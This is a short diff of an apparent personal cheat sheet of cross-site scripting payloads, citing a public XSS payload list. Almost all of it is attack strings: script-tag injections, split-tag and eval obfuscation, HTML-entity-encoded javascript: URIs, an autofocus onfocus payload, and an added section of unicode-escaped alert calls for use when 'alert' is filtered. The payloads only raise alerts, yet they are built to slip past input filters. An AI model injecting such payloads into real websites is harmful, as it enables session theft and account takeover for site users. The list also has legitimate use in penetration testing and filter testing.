@@ -2,8 +2,6 @@ https://github.com/payloadbox/xss-payload-list
 
 XSS PAYLOADS <3
 <inpuT autofocus oNFocus​="setTimeout(function() { /*\`*/top['al'+'\u0065'+'rt']([!+[]+!+[]]+[![]+[]][+[]])/*\`*/ }, 5000);"></inpuT%3E&lT;/stYle&lT;/titLe&lT;/teXtarEa&lT;/scRipt&gT;
-Basic payload
-
 <script>alert('XSS')</script>
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 "><script>alert('XSS')</script>
@@ -12,6 +10,13 @@ Basic payload
 <script>eval('\x61lert(\'33\')')</script>
 <script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
 <object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
+
+IF ALERT IS BLOCKED
+
+\u0061\u006C\u0065\u0072\u0074(1337)
+\u{61}\u{6C}\u{65}\u{72}\u{74}(1337)
+\u{61}\u{6C}\u{65}\u{72}\u{74}`1337`
+\u0061\u006C\u0065\u0072\u0074`1337`
 
 Img payload
 
